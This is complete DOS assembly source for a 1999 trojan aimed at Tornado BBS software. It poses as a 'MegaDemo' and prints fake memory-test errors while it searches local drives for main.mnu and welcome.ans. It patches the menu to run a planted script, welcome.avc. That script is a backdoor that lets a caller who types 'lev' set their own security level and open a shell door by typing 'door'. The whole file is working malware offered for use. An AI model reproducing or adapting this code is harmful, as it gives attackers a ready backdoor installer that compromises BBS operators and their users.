; Tornado Script Troyan v2.0 (c) 1999 by B!Z0n //[BzZ]
; Tested on Tornado/DOS 1.65gamma
;------------------------------------------
        .model tiny
        .286
        .code
        .startup
        org  100h
;------------------------------------------
CR      Equ  0Dh,0Ah
;------------------------------------------
TST:
;------------------------------------------
        mov     ah, 09h
        lea     dx, FakeLogo
        int     21h
;------------------------------------------
        mov     ax,1600h
        int     2fh
        cmp     ax,1600h                ; we execute under windoze?
        jne     Windows
        mov     ah, 09h
        lea     dx, Dos
        int     21h
        jmp     Exit
;------------------------------------------
Windows:
        mov     ah, 9h
        lea     dx, win
        int     21h
        lea     dx, Init
        int     21h
;------------------------------------------
Decrypt:
        lea     si, AddMenu
        mov     di, si
        mov     dx, [si]
        xor     dx, 0A0Dh
        mov     cx, (CurDisk - AddMenu) / 2 +1
cycle:                                      ; decrypt texts
        lodsw
        xor     ax, dx
        stosw
        loop    cycle
;------------------------------------------
        mov     ah, 19h                    ; Get current disk
        int     21h
        mov     [CurDisk], al
        mov     ah, 47h                    ; Get current dir
        cwd
        lea     si,oldpath
        push    si
        int     21h
        jmp     Hack
;------------------------------------------
; Fake Data
;------------------------------------------
FakeLogo        db CR,'TST MegaDemo (c) White Angel 1993 /DMG ',CR,CR
Detect          db 'Detected OS: $'
Init            db 'Searching for system resourses. Please wait...',CR,'$'
Dos             db 'DOS',CR,'$'
Win             db 'Windows',CR,'$'
Error           db 'Fatal error: $'
EMSerr          db 'EMS test fail. ',CR,'$'
XMSerr          db 'XMS test fail. ',CR,'$'
TmpErr          db "Can't create temp file.",CR,'$'
NoMem           db 'Need more memory.',CR,'$'
VIDEO           db 'VRAM test fail.',CR,'$'
FakeTmp         db 'temp.$$$',0
;------------------------------------------
Hack:   mov     ax, 1500h                  ; check CD ROM installed
        xor     bx, bx
        int     2fh
        or      bx, bx                     ; installed CD ROM
        jz      Scan
        mov     byte ptr [LastHD], cl      ; Save CD
;------------------------------------------
Scan:   mov     ah, 0Eh                    ; Set current disk
Disk    Equ     $+1
        mov     dl, 02h                    ; Start from C:
        inc     byte ptr [Disk]
        int     21h
        call    Search
LastHD  Equ     $+4
        cmp     byte ptr [Disk], 05h       ; C: D: E: or < CD ROM?
        jb      Scan                       ;
;------------------------------------------
        mov     ah, 0Eh                    ; Restore disk
        mov     dl, [CurDisk]
        int     21h
        pop     dx                         ; Restore path
        mov     ah,3Bh
        int     21h
        mov     ah, 09h
        lea     dx, Error
        int     21h
Exit:
        lea     dx, TmpErr
        int     21h
        mov     ax, 4C00h                  ; Exit to DOS
        int     21h
;-----------------------------------------
Search: lea     dx, StartPath
;-----------------------------------------
Recurse:
        mov     ah, 3Bh
        int     21h
        sub     sp, 2Ch
        mov     ah, 1Ah
        mov     dx, sp
        mov     si, 1Eh
        add     si, dx
        int     21h
;----------------------------------------------------------
        lea     dx, TMenu
        mov     di, dx
        xor     cx, cx
        mov     ah, 4Eh
        int     21h
        jnc     CheckMenu
SearchTxt:
        lea     dx, TWelcome
        mov     di, dx
        xor     cx, cx
        mov     ah, 4Eh
        int     21h
        jc      DirSearch
;----------------------------------------------------------
;Create welcome.avc
        mov     word ptr [di+9], 'cv'      ; change name to welcome.avc
        mov     ah, 3Ch                    ; Create welcome.avc
        mov     dx, di
        xor     cx, cx
        int     21h
        xchg    ax, bx                     ; fileheader -> bx
        mov     ah, 40h                    ; make script
        lea     dx, Script
        mov     cx, EndScript - Script
        int     21h
        mov     ah, 3eh                    ; close file
        int     21h
        mov     word ptr [di+9], 'sn'      ; restore name to welcome.ans
        jmp     DirSearch
;----------------------------------------------------------
;Patch main.mnu
CheckMenu:
        mov     ax, 3d02h                  ; open main.mnu r/w
        mov     dx, di
        int     21h
        xchg    ax, bx
        mov     ax, 4202h                  ; get menu size
        xor     cx, cx
        cwd
        int     21h                        ; check to hack
        sub     ax, 02h
        sbb     dx, 0
        push    ax dx                      ; cx=dx dx=ax
        pop     cx dx
        mov     ax, 4200h
        int     21h
        mov     ah, 3fh
        mov     cx, 02h
        lea     dx, TestBuff
        int     21h
        cmp     word ptr [TestBuff], ']Z'
        je      CloseFile                  ; close if hacked

;--- Patch Main menu ---
        lea     dx, AddMenu                ; patch main.mnu
        mov     si, 50h
AddCR:
        mov     ah, 40h
        mov     cx, 2
        int     21h
        dec     si
        jne     AddCR
        mov     ah, 40h
        mov     cx, Script - AddMenu
        int     21h
CloseFile:
        mov     ah, 3eh                    ; close file
        int     21h
        jmp     SearchTxt
;----------------------------------------------------------
DirSearch:
        mov     cx, 16
        lea     dx, all
        mov     ah, 4Eh
        int     21h
        jc      DelLocDTA
CheckDir:
        test    byte ptr [si-9], 16

        jz      FindNextDir
        cmp     word ptr [si], '.'
        jz      FindNextDir
        cmp     word ptr [si], '..'
        jz      FindNextDir

        push    si
        mov     dx, si
        call    Recurse
        lea     dx, UpDir
        mov     ah, 3Bh
        int     21h
        pop     si
        mov     ah, 1Ah
        lea     dx, [si-1Eh]
        int     21h

FindNextDir:
        mov     ah, 4Fh
        int     21h
        jnc     CheckDir
DelLocDTA:
        add     sp, 2Ch
        retn

AddMenu         db CR
                db 'Exec_Script "welcome.avc" 1 "" |'         ,CR
                db ';(x) B!Z0n //[BzZ]'
Script          db '// tR0Ya $CRiPt bY B!Z0n //[BzZ]'         ,CR
                db 'Variables'                                ,CR
                db '  str1    : String'                       ,CR
                db '  num1    : Number'                       ,CR
                db 'End'                                      ,CR
                db 'Program'                                  ,CR
                db '  SetCursorCoord (80, 80)'                ,CR
                db '  WriteLn("\04hACkED vS BzZ TST v2.0\00")',CR
                db '  ReadVar(str1, 5)'                       ,CR
                db '  If str1 = "lev"'                        ,CR
                db '    Write("\04!:\00")'                    ,CR
                db '    str1 = ""'                            ,CR
                db '    ReadVar(str1, 5)'                     ,CR
                db '    Val (str1, num1)'                     ,CR
                db '      If (num1>0) and (num1<65536)'       ,CR
                db '         $SECR = num1'                    ,CR
                db '      End'                                ,CR
                db '  End'                                    ,CR
                db '  If str1 = "door"'                       ,CR
                db '  DoorWay'                                ,CR
                db '  End'                                    ,CR
                db 'End'
EndScript       Equ $
TMenu           db 'main.mnu',0
TWelcome        db 'welcome.ans',0
StartPath       db '\',0
All             db '*.*',0
UpDir           db '..',0
CurDisk         db ?
CurPath         db 64 dup (?)
OldPath         db 64 dup (?)
TestBuff        db 5 dup (?)


end

